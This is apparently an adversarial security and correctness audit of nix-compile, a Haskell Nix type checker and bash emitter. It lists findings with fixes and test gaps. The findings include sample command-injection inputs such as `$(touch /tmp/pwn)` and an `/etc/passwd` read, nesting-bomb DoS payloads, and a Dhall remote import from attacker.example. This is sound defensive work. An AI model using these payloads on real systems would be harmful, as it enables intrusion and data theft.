# Adversarial Review — nix-compile (round 2)

**Date:** 2026-05-31
**Scope:** Full library audit, focused on findings _not_ already in `REVIEW.md` or `TODO.md`. Most findings below are net-new; a few sharpen or correct prior items.

---

## CRITICAL

### C1. Shell command injection in generated `emit-config` via `${VAR:-default}` defaults

**Files:** `lib/NixCompile/Bash/Facts.hs:407-410, 452-455` → `lib/NixCompile/Emit/Config.hs:433-435`

`ConfigVarDefault var def` and `ConfigVarAlternate var alt` capture the text between `:-`/`:+` and `}` from the source bash with `maybe "" id defaultValue` — **zero filtering**. That raw text is then embedded inside a double-quoted bash string in the generated `emit-config`:

```haskell
dynamicTemplate ("$(__nix_compile_escape_json \"${" <> var <> ":-" <> def <> "}\")")
```

Malicious source bash → injected shell in generated output:

| Source input                                 | Generated bash                  | Effect                                      |
| -------------------------------------------- | ------------------------------- | ------------------------------------------- |
| `config[k]="${UNSET:-$(touch /tmp/pwn)}"`    | `"${UNSET:-$(touch /tmp/pwn)}"` | `touch /tmp/pwn` runs when `UNSET` is empty |
| ``config[k]="${UNSET:-`id`}"``               | ``${UNSET:-`id`}``              | backtick substitution fires                 |
| `config[k]="${UNSET:-"; cat /etc/passwd #}"` | breaks out of the inner `"`     | arbitrary command after `;`                 |

`validConfigPath` only constrains the _key_; the default-value side has no validator. The injection-vulnerable text is wholly attacker-controllable from the source script. `test/Adversarial.hs:80-90` exercises injection only on the variable-name side; the default side is unfuzzed.

**Fix:** validate `def`/`alt` against the same `isSafeConfigChar` set at fact-construction time, or single-quote them in the emitted `${...:-...}` so bash treats them literally.

---

### C2. `inferExpr` and `Scope.buildExpr` are unguarded — every command except `check` is a DoS target

**Files:** `Infer.hs:692-711, 998-1007`, `Scope.hs:449-511`, `Formatter.hs:114-157`, `Format.hs:60`

The depth guard at `Check.hs:135-164` only runs in `checkFile`. All other call paths to `inferExpr`/`Scope.buildExpr`/`Formatter.printNExprF` are unguarded:

| Command                            | Entry function                                          | Has depth guard?   |
| ---------------------------------- | ------------------------------------------------------- | ------------------ |
| `check`                            | `Check.checkFile` → `detectUnsupportedConstruct`        | yes (the only one) |
| `infer`                            | `Nix.Format.formatFile` → `inferExpr`                   | **no**             |
| `fmt`                              | `Nix.Formatter.formatNixFile`                           | **no**             |
| `scope`/`scope-json`/`scope-dhall` | `Scope.fromNixFile`                                     | **no**             |
| `emit`                             | `parseScriptFile` (bash)                                | **no**             |
| LSP hover/inlay/definition         | `inferExprWithEnv`/`buildCrossScopeGraphWith`           | **no**             |
| module-graph build                 | `Module.processParsedFile` → `inferExpr`, `findImports` | **no**             |

A hostile `default.nix` of depth >200 OOMs every command except `check`. The LSP server in particular: one hostile buffer crashes the server for the entire workspace.

**Fix:** lift `detectUnsupportedConstruct` into a `wellFormedExpr` precondition checked in every public CLI entry, or push the depth counter into `inferExpr`/`buildExpr`/`printNExprF` themselves.

---

### C3. `detectUnsupportedConstruct` skips entire AST shapes — depth guard is bypassable

**File:** `lib/NixCompile/CLI/Check.hs:135-164`

The detector's `case expression of` lists `NAbs`, `NLet`, `NSet`, `NList`, `NBinary`, `NUnary`, `NSelect`, `NHasAttr`, `NApp`, `NIf`, `NAssert` — then `_ -> Nothing`. **Constructors not handled stop the walk:**

- `NWith _ body` — `with x; (with y; (with z; ... ))` chains evade detection. The detector returns `Nothing` → `Check.hs:58` runs `checkWithViolations … False` → `inferExpr` runs on the full depth.
- `NStr (DoubleQuoted [Antiquoted bomb])` — antiquotations are not descended into. `"${"${"${...bomb...}"}"}"` evades the detector. (Also `NStr (Indented _ _)`.)
- `NSynHole _` — same.

The detector is also depth-incrementing only inside _matched_ constructors, so a chain of unhandled constructors counts as depth 0.

`LintCombined.combinedLint` has its own guard, so lint runs are safe. `inferExpr` does not — see C2.

**Fix:** make the catch-all `_ -> Nothing` into `_ -> Nothing` only after recursing into children, or invert the design to count depth on _every_ `Fix` unwrap regardless of constructor.

---

### C4. hnix/megaparsec stack-overflow not caught

**Files:** `Nix/Parse.hs:85-97`, `Bash/Parse.hs:80-84`, `Module.hs:177-180`

Parsers recurse on the call stack. A payload of ~10⁴ nested parens overflows the Haskell stack and throws `Control.Exception.StackOverflow` (async, not synchronous). All three call sites catch `IOException` only:

```haskell
result <- try (parseNixFileLoc (Path path))   -- :: IO (Either IOException _)
```

`StackOverflow` is not an `IOException`, so it propagates. In the CLI this crashes the process; in the LSP it crashes the server for every project that server is hosting. There is no `bracket`/`handle SomeException` anywhere in `LSP/Handlers.hs`.

**Fix:** use `try @SomeException` (or `evaluate . force`) around every parser invocation, and surface the failure as a structured error.

---

### C5. Directory-boundary check is string-prefix without separator — sibling dirs walked

**File:** `lib/NixCompile/CLI/CI.hs:256`

```haskell
if canonical `Set.member` visited || not (canonicalRoot `isPrefixOf` canonical)
```

`canonicalRoot = "/home/u/proj"` and `canonical = "/home/u/proj-evil"` → `isPrefixOf` returns **True**. A sibling directory whose name has `proj` as a prefix is treated as inside-root and walked. `processImport` in `Module.hs:237-238` does the same check **but with the path separator appended**, so it's safe — the CI walker is not.

**Fix:** `(canonicalRoot ++ [pathSeparator]) ``isPrefixOf`` canonical || canonical == canonicalRoot` — match the `Module.hs` form.

---

### C6. Dhall config loader allows remote imports

**File:** `lib/NixCompile/Config.hs:136`

```haskell
result <- try (Dhall.inputFile Dhall.auto path)
```

`Dhall.inputFile` with default settings permits Dhall `import` statements that fetch over HTTPS. A repo containing a `.nix-compile.dhall` of the form:

```dhall
let payload = https://attacker.example/x.dhall in { ... }
```

makes `nix-compile check` perform an outbound HTTPS request whenever it loads its config. Cloning a hostile repo and running CI is sufficient. The remote payload can also exfiltrate via DNS resolution of the host name.

**Fix:** use `Dhall.inputWithSettings` with `Dhall.localOnly` (or set `defaultEvaluateSettings` substitution to reject `Remote` imports).

---

## SOUNDNESS (type checker accepts programs it should reject)

The agent enumerated these in detail; the most damaging are:

### S1. `(TAny, _)` and `(_, TAny)` unify silently — combined with `head`/`tail`/`length : … TAny`, the type system has a universal escape hatch

**File:** `Infer.hs:289-290`, `Infer.hs:133-146`

`builtins.head [1 2 3] + true` type-checks. Any program that flows a value through `builtins.head` (or any builtin that returns `TAny`) effectively loses type information for the rest of the program.

### S2. `inferSelect` invents a fresh tvar for missing keys on closed attrsets

**File:** `Infer.hs:567,571`

`{ a = 1; }.nonexistent` does not fail — it returns a polymorphic var. This is the most common Nix error class and the type checker can't catch it.

### S3. `inferSymbol` returns `freshVar` for unbound names

**File:** `Infer.hs:592`

`nonExistentSym + 1` type-checks as `Int`. There is no unbound-variable check anywhere; `with` shadowing is not modeled, so anything outside scope flows as a fresh polymorphic var.

### S4. `inferHasAttr` ignores the attribute path

**File:** `Infer.hs:574-577`

`pkgs ? "anything"` is always `Bool` with no constraint linking the test to the actual attrset.

### S5. Nested-path bindings (`{ a.b = 1; }`) silently dropped

**File:** `Infer.hs:743, 759, 800`

`inferRecBinding _ (NamedVar (StaticKey _ :| []) _ _)` matches singleton paths only; multi-segment paths fall to `_ -> pure []`. No binding emitted, no error logged. `{ a.b = "s"; }.a.b` selects `freshVar.b` → `freshVar`. Type checker is silently wrong.

### S6. `NPlus` accepts any `(t, t)` — including `null + null`, `true + true`

**File:** `Infer.hs:626-628`

Nix-runtime rejects these; the type checker doesn't.

---

## SIGNIFICANT

### B1. `combinedLint` silently returns `emptyBundle` past depth 200

**File:** `lib/NixCompile/Nix/LintCombined.hs:67-70`

The depth guard returns `emptyBundle` rather than signalling. An attacker can hide real violations by burying them past depth 200; the caller reports "no violations" indistinguishably from "depth-limited".

### B2. LSP cache invalidates only on `flake.nix` save; `didChange` never invalidates; cache key is path-only

**File:** `lib/NixCompile/LSP/Handlers.hs:107-121, 967-987, 989-1000`

- Editing `default.nix` and saving → cache stale forever.
- Editing in-buffer (no save) → cross-module hover/definition always stale.
- Two flakes at the same root path (e.g., `git checkout`-ed between branches with different module sets) reuse the previous graph; key has no mtime, no content hash, no flake-lock version.
- `voidProjectDiags` (Handlers.hs:752) is a fire-and-forget `async` that builds a module graph and discards it — pure CPU waste, plus the `Async` handle is discarded so exceptions are swallowed (zombie thread / leaked AST until GC). Concurrent with foreground `getOrBuildModuleGraph`, two threads race to build the same graph; last write wins.

### B3. LSP has no exception handling around `buildModuleGraph`

**File:** `lib/NixCompile/LSP/Handlers.hs` (no `try`/`catch`/`bracket` anywhere)

If `buildModuleGraph` throws (filesystem errors, hnix `StackOverflow`, any non-Either failure), the exception propagates to the LSP handler with no negative caching. The next request retries the same failing build. With `lsp 2.7`'s single dispatch thread this means a _single_ hostile file blocks all interactive features.

### B4. `spToDiagnostic` underflows to ~4 billion on 0-based bash spans

**File:** `lib/NixCompile/LSP/Handlers.hs:792-810`

```haskell
(line - 1, col - 1) → fromIntegral :: UInt32
```

ShellCheck positions are 0-based (per `TODO.md` and prior REVIEW); a span at `Loc 0 5` triggers the `else` branch (col > 0), then `line - 1 = -1`, then `fromIntegral (-1) :: UInt32` wraps to `4294967295`. The bash diagnostic ends up at a wraparound line. (The guard at `:793` requires _both_ line and col to be ≤ 0.) Off-by-one between Nix and bash diagnostics is acknowledged in `TODO.md` but the wrap is new.

### B5. `voidProjectDiags` is a no-op stub

**File:** `lib/NixCompile/LSP/Handlers.hs:755-769`

Builds `Mod.buildModuleGraph`, then `case … of Right _ -> pure ()`. Discards the result, never updates the cache, never publishes diagnostics. Pure CPU/IO waste on every `didOpen`/`didSave`, while leaking parsed-AST memory.

### B6. `findProjectRoot` silently caps walk-up at 10 levels

**File:** `lib/NixCompile/LSP/Handlers.hs:918`

Deeply-nested workspaces return `Nothing` → LSP gives up on cross-module features with no log message. The walk-up bound is a magic 10.

### B7. `unsafePerformIO`-wrapped MVar shared across the entire process

**File:** `lib/NixCompile/LSP/Handlers.hs:62-64`

```haskell
{-# NOINLINE moduleGraphCache #-}
moduleGraphCache :: MVar (Map FilePath ModuleGraph)
moduleGraphCache = unsafePerformIO $ newMVar Map.empty
```

OK for the binary, but the module is in a library — tests instantiating the LSP twice share global state across runs.

---

## CORRECTNESS (rejected programs that should typecheck)

### Co1. `λx. x // {a=1;}` over-constrains `x` to exactly `{a:Int}`

**File:** `Infer.hs:644-651`

The `//` operator's `TVar` fallback `unify leftT rightT` collapses `x` to the right operand's exact shape. Calling such a lambda with `{a=1; b=2;}` (correctly) fails — but `{a=1;}` works only by accident; the polymorphism is gone.

### Co2. Synthetic `NSelect` carries `nullSpan` — `inherit (scope) name` failures report `(0,0)`

**File:** `Infer.hs:754, 794, 823`

When `inferRecBinding`/`inferNonRecursiveBinding` reaches an `Inherit (Just scope) names`, it builds a synthetic `NSelect` with `nullSpan` to drive inference. Errors inside that path lose source location — the user sees `(0,0)`. (Aligned with REVIEW DESIGN-4 but the specific synthetic-NSelect path is new.)

---

## DESIGN

### D1. Three independent magic-`200` depth constants — drift-prone

**Files:** `Check.hs:133`, `Check.hs:176`, `LintCombined.hs:67`

Copy-pasted. One cannot be tightened without the others. Extract a single `Defaults.maxRecursionDepth`.

### D2. `cmdInfer`/`cmdFmt`/`cmdEmit`/`cmdScope*` use an empty environment — cross-module types are ignored outside `check`

**Files:** `Dispatch.hs:67-111`, `Format.hs:58-64`

`formatExpr'` calls `inferExpr expr` with no environment, so `import ./foo.nix` always resolves to `TAny`. Only `Module.inferModuleTypes` builds a cross-module env; the `infer` CLI command does not consume it.

### D3. `findImports` walks the AST but `LayoutConvention.validateFileFromExpr` walks it again, and `combinedLint` walks it a third time, and `inferExpr` walks it a fourth

**File:** `Module.hs:192-197`

Each `processParsedFile` does four passes over the same AST. Acknowledged for `detectUnsupportedConstruct` + `combinedLint` in prior REVIEW (DESIGN-1) — the module-graph path adds two more.

### D4. `parseConfigValue` decides quoting by _prefix matching the source text_

**File:** `Bash/Patterns.hs:203-223`

```haskell
| "\"${" `T.isPrefixOf` text && "\"" `T.isSuffixOf` text = ...
```

A value like `"hello" ; cmd` matches `"\"" prefix + "\"" suffix` and is treated as a quoted string. Edge cases involving `"hello\" with embedded quote"` (which ShellCheck would parse correctly) are not handled here because the parser is text-level, not token-level. The token-level path in `Facts.hs` exists; this text-level fallback could be removed or hardened.

---

## PERFORMANCE

### P1. `Module.findImports` uses `++` for list accumulation

**File:** `Module.hs:255-265, 254`

`concatMap walkBinding bindings ++ walkExpr body` accumulates with `++` everywhere. Deep AST = O(n²) thunks. (Aligned with REVIEW PERF-1.)

### P2. `walkDirectory` calls `Set.toList ignoredDirs` inside a fold

**File:** `CI.hs:273`

```haskell
if entry `elem` Set.toList ignoredDirs then ...
```

`Set.toList` rebuilt per-entry per-directory. Use `Set.member`.

---

## TEST GAPS (beyond REVIEW.md)

1. **Default-value injection.** No test feeds `"${UNSET:-$(...)}"` through `parseScriptFile` and checks that the emitted bash is escape-clean.
2. **Depth-guard bypass via `NWith`.** No test on `with a; (with b; ...)` 250-deep.
3. **Depth-guard bypass via `NStr` antiquotation.** No test on `"${"${...}"}"` 250-deep.
4. **`inferExpr` direct DoS.** All depth tests go through `Check.checkFile`; none through `cmdInfer`/`cmdScope`/`cmdFmt`.
5. **Stack-overflow parens.** No test feeds `(((...)))` to verify that the process survives.
6. **Sibling-directory boundary escape.** No test creates `/tmp/proj` and `/tmp/proj-evil` and confirms the latter is _not_ walked.
7. **Dhall remote-import.** No test that a `.nix-compile.dhall` containing `https://...` either resolves locally or fails closed.
8. **LSP cache staleness.** No test edits an imported file in-buffer and verifies hover on the importer returns the new type.

---

## SUMMARY

| Severity    | Count | Highest-impact                                                                                                      |
| ----------- | ----- | ------------------------------------------------------------------------------------------------------------------- |
| Critical    | 6     | C1 (default-value command injection), C2 (unguarded `inferExpr`/`scope`/`fmt`), C4 (parser stack overflow uncaught) |
| Soundness   | 6     | S2 (`{a=1;}.x` doesn't fail), S3 (no unbound-variable check)                                                        |
| Significant | 7     | B1 (lint silently drops at depth 200), B3 (no exception handling in LSP)                                            |
| Correctness | 2     | Co1 (`//` over-constraint)                                                                                          |
| Design      | 4     |                                                                                                                     |
| Performance | 2     |                                                                                                                     |
| Test gaps   | 8     |                                                                                                                     |

The three highest-leverage fixes:

1. **C1** + the corresponding default-value validator/escape — this is the only finding that crosses a trust boundary.
2. **C2/C3/C4** as a bundle: centralize depth + stack-overflow handling in a single `safeAnalyze :: NExprLoc -> Either DoS NExprLoc` and call it from _every_ public entry. The single-handler pattern fixes the LSP DoS and the CLI commands at once.
3. **S2/S3** — closed-set missing-key and unbound-symbol checks. These are the two single biggest type-error blind spots; either one alone would catch a large class of real Nix bugs that the tool currently misses.
